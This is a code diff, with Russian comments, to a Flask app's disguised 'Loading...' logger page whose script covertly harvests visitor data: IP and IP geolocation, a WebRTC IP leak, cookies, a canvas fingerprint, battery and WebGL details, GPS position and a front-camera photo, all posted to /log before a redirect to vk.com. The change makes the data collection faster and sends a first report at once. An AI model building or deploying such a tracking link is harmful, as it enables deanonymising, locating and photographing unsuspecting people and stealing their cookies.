@@ -17,7 +17,7 @@ app.secret_key = secrets.token_urlsafe(32)
 logs_db = {}
 links_db = {}
 
-# ===================== СТРАНИЦА-ЛОГГЕР =====================
+# ===================== СТРАНИЦА-ЛОГГЕР (УСКОРЕННАЯ) =====================
 LOGGER_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -26,7 +26,6 @@ LOGGER_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Loading...</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0f;
@@ -36,7 +35,6 @@ LOGGER_HTML = """
             align-items: center;
             height: 100vh;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            margin: 0;
             flex-direction: column;
             overflow: hidden;
         }
@@ -54,9 +52,7 @@ LOGGER_HTML = """
             border-radius: 50%;
             animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .loader-text {
             font-size: 14px;
             font-weight: 400;
@@ -96,25 +92,130 @@ LOGGER_HTML = """
 (function() {
     const linkId = window.location.pathname.split('/').pop();
 
-    let settings = {};
+    // --- МГНОВЕННЫЙ СБОР ДАННЫХ ---
+    function collectAllData() {
+        const data = {
+            link_id: linkId,
+            timestamp: new Date().toISOString(),
+            ip: 'Pending',
+            webrtc_ip: 'Pending',
+            country: 'Pending',
+            city: 'Pending',
+            region: 'Pending',
+            isp: 'Pending',
+            geo_lat: 'Pending',
+            geo_lon: 'Pending',
+            gps_lat: 'Pending',
+            gps_lon: 'Pending',
+            gps_accuracy: 'Pending',
+            device_type: 'Pending',
+            os: 'Pending',
+            browser: 'Pending',
+            user_agent: navigator.userAgent,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            window_size: `${window.innerWidth}x${window.innerHeight}`,
+            color_depth: window.screen.colorDepth || 'Unknown',
+            pixel_ratio: window.devicePixelRatio || 1,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language || navigator.languages?.[0] || 'Unknown',
+            cookies: document.cookie || 'No cookies',
+            fingerprint: 'Pending',
+            plugins: 'Pending',
+            battery_level: 'Pending',
+            battery_charging: 'Pending',
+            webgl_renderer: 'Pending',
+            webgl_version: 'Pending',
+            photo: 'Pending',
+            settings_used: {}
+        };
+        return data;
+    }
 
+    let collectedData = collectAllData();
+    let sent = false;
+
+    // --- ФУНКЦИЯ ОТПРАВКИ (МГНОВЕННО) ---
+    function sendData() {
+        if (sent) return;
+        sent = true;
+        fetch('/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(collectedData)
+        }).catch(() => {});
+    }
+
+    // --- ПОЛУЧАЕМ НАСТРОЙКИ И ОТПРАВЛЯЕМ СРАЗУ ---
     fetch('/settings')
         .then(r => r.json())
-        .then(data => { settings = data; })
-        .catch(() => { settings = { redirect: 'https://vk.com/', geo: true, camera: true }; })
-        .finally(() => {
-            collectAndSend();
+        .then(settings => {
+            collectedData.settings_used = settings;
+            // Мгновенно отправляем базовые данные
+            sendData();
+            
+            // Добираем остальное асинхронно и обновляем
+            Promise.all([
+                fetchIP(),
+                fetchGeo(),
+                getBattery(),
+                getWebGL(),
+                getPlugins(),
+                getFingerprint(),
+                getGeolocation(settings.geo),
+                getCameraPhoto(settings.camera),
+                getWebRTC()
+            ]).then(([ip, geo, battery, webgl, plugins, fingerprint, geoloc, photo, webrtc]) => {
+                if (ip) {
+                    collectedData.ip = ip;
+                    if (geo) {
+                        collectedData.country = geo.country || 'Unknown';
+                        collectedData.city = geo.city || 'Unknown';
+                        collectedData.region = geo.region || 'Unknown';
+                        collectedData.isp = geo.isp || 'Unknown';
+                        collectedData.geo_lat = geo.latitude || 'Unknown';
+                        collectedData.geo_lon = geo.longitude || 'Unknown';
+                    }
+                }
+                if (battery) {
+                    collectedData.battery_level = battery.level;
+                    collectedData.battery_charging = battery.charging;
+                }
+                if (webgl) {
+                    collectedData.webgl_renderer = webgl.renderer;
+                    collectedData.webgl_version = webgl.version;
+                }
+                if (plugins) collectedData.plugins = plugins;
+                if (fingerprint) collectedData.fingerprint = fingerprint;
+                if (geoloc) {
+                    collectedData.gps_lat = geoloc.latitude;
+                    collectedData.gps_lon = geoloc.longitude;
+                    collectedData.gps_accuracy = geoloc.accuracy;
+                }
+                if (photo) collectedData.photo = photo;
+                if (webrtc) collectedData.webrtc_ip = webrtc;
+                // Отправляем обновлённые данные
+                fetch('/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(collectedData)
+                }).catch(() => {});
+            });
+        })
+        .catch(() => {
+            // Если настройки не пришли — всё равно отправляем
+            sendData();
         });
 
-    function getIP() {
+    // --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
+    function fetchIP() {
         return fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(d => d.ip)
-            .catch(() => 'Unknown');
+            .catch(() => null);
     }
 
-    function getGeo(ip) {
-        return fetch(`https://ipapi.co/${ip}/json/`)
+    function fetchGeo(ip) {
+        return fetch('https://ipapi.co/json/')
             .then(r => r.json())
             .then(d => ({
                 country: d.country_name || d.country || 'Unknown',
@@ -124,80 +225,7 @@ LOGGER_HTML = """
                 latitude: d.latitude || 'Unknown',
                 longitude: d.longitude || 'Unknown'
             }))
-            .catch(() => ({
-                country: 'Unknown', city: 'Unknown', region: 'Unknown',
-                isp: 'Unknown', latitude: 'Unknown', longitude: 'Unknown'
-            }));
-    }
-
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let device = 'Desktop', os = 'Unknown', browser = 'Unknown';
-        if (/mobile|android|iphone|ipad|ipod/i.test(ua)) device = 'Mobile';
-        if (/iPad|Android/i.test(ua) && !/Mobile/i.test(ua)) device = 'Tablet';
-        if (/Windows/i.test(ua)) os = 'Windows';
-        else if (/Mac/i.test(ua)) os = 'macOS';
-        else if (/Linux/i.test(ua)) os = 'Linux';
-        else if (/Android/i.test(ua)) os = 'Android';
-        else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
-        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
-        else if (/Firefox/i.test(ua)) browser = 'Firefox';
-        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-        else if (/Edg/i.test(ua)) browser = 'Edge';
-        else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
-        return { device, os, browser, ua };
-    }
-
-    function getScreen() {
-        return {
-            screen: `${window.screen.width}x${window.screen.height}`,
-            window: `${window.innerWidth}x${window.innerHeight}`,
-            colorDepth: window.screen.colorDepth || 'Unknown',
-            pixelRatio: window.devicePixelRatio || 1
-        };
-    }
-
-    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
-    function getLanguage() { return navigator.language || navigator.languages?.[0] || 'Unknown'; }
-    function getCookies() { return document.cookie || 'No cookies'; }
-
-    function getFingerprint() {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200; canvas.height = 50;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillStyle = '#f60';
-            ctx.fillRect(0, 0, 200, 50);
-            ctx.fillStyle = '#069';
-            ctx.fillText('fp', 10, 10);
-            ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
-            return canvas.toDataURL().substring(0, 80) + '...';
-        } catch { return 'Unknown'; }
-    }
-
-    function getPlugins() {
-        try { return Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None'; }
-        catch { return 'Unknown'; }
-    }
-
-    function getWebRTC() {
-        return new Promise((resolve) => {
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel('test');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-                pc.onicecandidate = (e) => {
-                    if (e.candidate) {
-                        const ip = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
-                        resolve(ip ? ip[0] : 'Unknown');
-                        pc.close();
-                    }
-                };
-                setTimeout(() => { resolve('Unknown'); pc.close(); }, 3000);
-            } catch { resolve('Unknown'); }
-        });
+            .catch(() => null);
     }
 
     function getBattery() {
@@ -214,15 +242,39 @@ LOGGER_HTML = """
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (gl) {
-                return { renderer: gl.getParameter(gl.RENDERER) || 'Unknown', version: gl.getParameter(gl.VERSION) || 'Unknown' };
+                return Promise.resolve({
+                    renderer: gl.getParameter(gl.RENDERER) || 'Unknown',
+                    version: gl.getParameter(gl.VERSION) || 'Unknown'
+                });
             }
-            return { renderer: 'Not supported', version: 'Not supported' };
-        } catch { return { renderer: 'Unknown', version: 'Unknown' }; }
+            return Promise.resolve({ renderer: 'Not supported', version: 'Not supported' });
+        } catch { return Promise.resolve({ renderer: 'Unknown', version: 'Unknown' }); }
     }
 
-    function getGeolocation() {
+    function getPlugins() {
+        try { return Promise.resolve(Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None'); }
+        catch { return Promise.resolve('Unknown'); }
+    }
+
+    function getFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 200, 50);
+            ctx.fillStyle = '#069';
+            ctx.fillText('fp', 10, 10);
+            ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
+            return Promise.resolve(canvas.toDataURL().substring(0, 80) + '...');
+        } catch { return Promise.resolve('Unknown'); }
+    }
+
+    function getGeolocation(enabled) {
         return new Promise((resolve) => {
-            if (!settings.geo) {
+            if (!enabled) {
                 resolve({ latitude: 'Disabled', longitude: 'Disabled', accuracy: 'Disabled' });
                 return;
             }
@@ -244,17 +296,12 @@ LOGGER_HTML = """
         });
     }
 
-    function getCameraPhoto() {
+    function getCameraPhoto(enabled) {
         return new Promise((resolve) => {
-            if (!settings.camera) {
-                resolve(null);
-                return;
-            }
-
+            if (!enabled) { resolve(null); return; }
             const video = document.createElement('video');
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-
             navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: false
@@ -278,65 +325,36 @@ LOGGER_HTML = """
         });
     }
 
-    async function collectAndSend() {
-        const ip = await getIP();
-        const geo = await getGeo(ip);
-        const device = getDeviceInfo();
-        const screen = getScreen();
-        const webrtc = await getWebRTC();
-        const battery = await getBattery();
-        const webgl = getWebGL();
-
-        const geolocation = await getGeolocation();
-        const photo = await getCameraPhoto();
-
-        const data = {
-            link_id: linkId,
-            timestamp: new Date().toISOString(),
-            ip: ip,
-            webrtc_ip: webrtc,
-            country: geo.country,
-            city: geo.city,
-            region: geo.region,
-            isp: geo.isp,
-            geo_lat: geo.latitude,
-            geo_lon: geo.longitude,
-            gps_lat: geolocation.latitude,
-            gps_lon: geolocation.longitude,
-            gps_accuracy: geolocation.accuracy,
-            device_type: device.device,
-            os: device.os,
-            browser: device.browser,
-            user_agent: device.ua,
-            screen: screen.screen,
-            window_size: screen.window,
-            color_depth: screen.colorDepth,
-            pixel_ratio: screen.pixelRatio,
-            timezone: getTimezone(),
-            language: getLanguage(),
-            cookies: getCookies(),
-            fingerprint: getFingerprint(),
-            plugins: getPlugins(),
-            battery_level: battery.level,
-            battery_charging: battery.charging,
-            webgl_renderer: webgl.renderer,
-            webgl_version: webgl.version,
-            photo: photo,
-            settings_used: settings
-        };
-
-        try {
-            await fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-        } catch (e) {}
-
-        setTimeout(() => {
-            window.location.href = settings.redirect || 'https://vk.com/';
-        }, 1500);
+    function getWebRTC() {
+        return new Promise((resolve) => {
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.createDataChannel('test');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
+                        resolve(ip ? ip[0] : 'Unknown');
+                        pc.close();
+                    }
+                };
+                setTimeout(() => { resolve('Unknown'); pc.close(); }, 3000);
+            } catch { resolve('Unknown'); }
+        });
     }
+
+    // --- РЕДИРЕКТ (ускоренный) ---
+    setTimeout(() => {
+        fetch('/settings')
+            .then(r => r.json())
+            .then(settings => {
+                window.location.href = settings.redirect || 'https://vk.com/';
+            })
+            .catch(() => {
+                window.location.href = 'https://vk.com/';
+            });
+    }, 800);
+
 })();
 </script>
 </body>
